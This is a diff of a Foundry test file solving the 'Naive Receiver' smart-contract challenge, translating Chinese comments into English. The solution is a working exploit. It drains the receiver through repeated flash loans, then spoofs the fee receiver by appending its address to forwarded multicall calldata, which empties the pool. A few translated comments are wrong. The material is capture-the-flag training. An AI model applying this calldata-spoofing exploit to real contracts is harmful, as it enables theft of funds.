@@ -8,82 +8,86 @@ import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol"
 import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
-	//根据给定的字符串"deployer"创建地址并赋值给deployer
+	// Generate address from string "deployer"
     address deployer = makeAddr("deployer");
-	//创建地址并赋值给recovery
+	// Generate address from string "recovery"
     address recovery = makeAddr("recovery");
 	//声明状态变量：player用做当前闯关用户地址
     address player;
-	//声明状态变量：playerPk用做player的私钥
+	// State variable: player address for the challenge
     uint256 playerPk;
 	
-	//常量：NaiveReceiverPool合约的余额
+	// Constant: Initial WETH balance of NaiveReceiverPool
     uint256 constant WETH_IN_POOL = 1000e18;
-	//常量：player用户的余额
+	// Constant: Initial WETH balance of NaiveReceiverPool
     uint256 constant WETH_IN_RECEIVER = 10e18;
 	
-	//声明NaiveReceiverPool合约变量
+	// Declaration of NaiveReceiverPool contract variable
     NaiveReceiverPool pool;
-	//weth代币地址
+	// WETH token instance
     WETH weth;
     FlashLoanReceiver receiver;
-	//BasicForwarder合约变量
+	// BasicForwarder instance
     BasicForwarder forwarder;
 
-	//修饰符，在运行函数前先运行修饰符的内容
+	// Modifier: Executes before the target test function
     modifier checkSolvedByPlayer() {
-		//开始冒充player用户，之后msg.sender和txt.origin的角色都为player
+		// Start pranking as player (both msg.sender and tx.origin are set to player)
         vm.startPrank(player, player);
-		//执行test_naiveReceiver()函数体
+		
+		// Execute test_naiveReceiver() test body
         _;
-		//停止冒充player用户
+		
+		// Stop pranking player
         vm.stopPrank();
-		//调用执行_isSolved()函数
+		
+		// Call _isSolved() to verify challenge conditions
         _isSolved();
     }
 
     /**
      * SETS UP CHALLENGE - DO NOT TOUCH
      */
-    function setUp() public {//在运行其他函数之前会先运行此函数
-		//创建私钥playerPk和公钥player
+    function setUp() public {// Generate player private key (playerPk) and public address (player)
+		// Generate player private key (playerPk) and public address (player)
         (player, playerPk) = makeAddrAndKey("player");
-		//冒充player用户，如果用户没有余额，则会发送1ETH
+		// Start hoax as deployer (impersonates deployer and funds 1 ETH if balance is low)
         startHoax(deployer);
 
         // Deploy WETH
-        weth = new WETH();//部署WETH合约
+        weth = new WETH();
 
         // Deploy forwarder
-        forwarder = new BasicForwarder();//部署BasicForwarder合约
+        forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);//部署NaiveReceiverPool合约，转账1000e18，并入参forwarder、weth和deployer
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
-        receiver = new FlashLoanReceiver(address(pool));//部署FlashLoanReceiver合约并入参pool
-		//存钱10e18
+        receiver = new FlashLoanReceiver(address(pool));
+		
+		// Deposit 10 ETH to convert to 10 WETH
         weth.deposit{value: WETH_IN_RECEIVER}();
-		//转账10e18给receiver
+		// Transfer 10 WETH to receiver contract
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
 
-		//停止冒充用户
+		// Stop impersonating deployer
         vm.stopPrank();
     }
 
     function test_assertInitialState() public {
         // Check initial balances
-        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);//断言，验证pool合约地址的余额是不是1000e18
-        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);//断言，验证receiver合约地址的余额是不是10e18
+        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);// Assert pool contract balance equals 1000 WETH
+        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);// Assert receiver contract balance equals 10 WETH
 
         // Check pool config
-        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);//断言，验证最大闪电贷是不是1000e18
-        assertEq(pool.flashFee(address(weth), 0), 1 ether);//断言，验证闪电贷手续费是不是1 ether
-        assertEq(pool.feeReceiver(), deployer);//断言，验证feeReceiver地址是不是deployer
+        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);// Assert maximum flash loan equals 1000 WETH
+        assertEq(pool.flashFee(address(weth), 0), 1 ether);// Assert flash loan fee equals 1 WETH
+        assertEq(pool.feeReceiver(), deployer);// Assert feeReceiver address is deployer
 
         // Cannot call receiver
-        vm.expectRevert(bytes4(hex"48f5c3ed"));//下一个调用必须报错并返回报错信息48f5c3ed
-        receiver.onFlashLoan(//验证是否可以直接调用onFlashLoan()函数（此函数调用会报错）
+        vm.expectRevert(bytes4(hex"48f5c3ed"));// Expect revert with selector 0x48f5c3ed
+        receiver.onFlashLoan(// Verify direct call to onFlashLoan() reverts
             deployer,
             address(weth), // token
             WETH_IN_RECEIVER, // amount
@@ -96,10 +100,10 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // 1. 准备 11 个子调用的 calldata 数组
+        // 1. Prepare calldata array for 11 sub-calls
 		bytes[] memory calldatas = new bytes[](11);
 
-		// 前 10 个子调用：发起 10 次 flashLoan，把 receiver 的 10 WETH 手续费抽进 Pool
+		// Sub-calls 1 to 10: Invoke flashLoan 10 times to drain 10 WETH in fees from receiver into pool
 		for (uint256 i = 0; i < 10; i++) {
 			calldatas[i] = abi.encodeWithSelector(
 				pool.flashLoan.selector,
@@ -110,23 +114,23 @@ contract NaiveReceiverChallenge is Test {
 			);
 		}
 
-		// 第 11 个子调用：构造 withdraw(1010 ether, recovery)
+		// Sub-call 11: Construct withdraw(1010 ether, recovery)
 		bytes memory withdrawCalldata = abi.encodeWithSelector(
 			pool.withdraw.selector,
-			1010 ether, // 1000 原有 + 10 抽来的手续费
+			1010 ether, // 1000 initial + 10 drained fees
 			payable(recovery)
 		);
 
-		// 核心漏洞利用：在 withdrawCalldata 末尾追加 feeReceiver (Deployer) 的 20 字节地址！
+		// Core Exploit: Append feeReceiver (deployer) 20-byte address to the tail of withdrawCalldata!
 		calldatas[10] = abi.encodePacked(withdrawCalldata, pool.feeReceiver());
 
-		// 2. 将这 11 个子调用打包进 multicall
+		// 2. Package all 11 sub-calls into multicall
 		bytes memory multicallData = abi.encodeWithSelector(
 			pool.multicall.selector,
 			calldatas
 		);
 
-		// 3. 构造 BasicForwarder 的请求结构体（签名人填 player 自己）
+		// 3. Construct BasicForwarder Request struct (signed by player)
 		BasicForwarder.Request memory request = BasicForwarder.Request({
 			from: player,
 			target: address(pool),
@@ -137,7 +141,7 @@ contract NaiveReceiverChallenge is Test {
 			data: multicallData
 		});
 
-		// 4. 对请求进行 EIP-712 链下签名（用 player 的私钥）
+		// 4. Perform off-chain EIP-712 signature (using player private key)
 		bytes32 requestHash = keccak256(
 			abi.encodePacked(
 				"\x19\x01",
@@ -145,11 +149,12 @@ contract NaiveReceiverChallenge is Test {
 				forwarder.getDataHash(request)
 			)
 		);
-		// 根据 Foundry 的签名规则对 requestHash 进行签名
+		
+		// Sign requestHash following Foundry cheats
 		(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
 		bytes memory signature = abi.encodePacked(r, s, v);
 
-		// 5. 由中继者/Player 发起交易，通过 Forwarder 触发全套攻击！
+		// 5. Relayer/Player submits transaction via Forwarder to trigger the full exploit!
 		forwarder.execute(request, signature);
     }
 
@@ -158,15 +163,15 @@ contract NaiveReceiverChallenge is Test {
      */
     function _isSolved() private view {
         // Player must have executed two or less transactions
-        assertLe(vm.getNonce(player), 2);//断言，getNonce(player)必须小于等于2，不然就报错（getNonce获取palyer调用链上的次数）
+        assertLe(vm.getNonce(player), 2);// Assert player transaction count (nonce) <= 2
 
         // The flashloan receiver contract has been emptied
-        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");//断言，receiver余额必须等于0
+        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");// Assert receiver balance == 0
 
         // Pool is empty too
-        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");//断言，pool余额必须等于0
+        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");// Assert pool balance == 0
 
         // All funds sent to recovery account
-        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");//断言，recovery余额必须等于1010
+        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");// Assert recovery balance == 1010 WETH
     }
 }
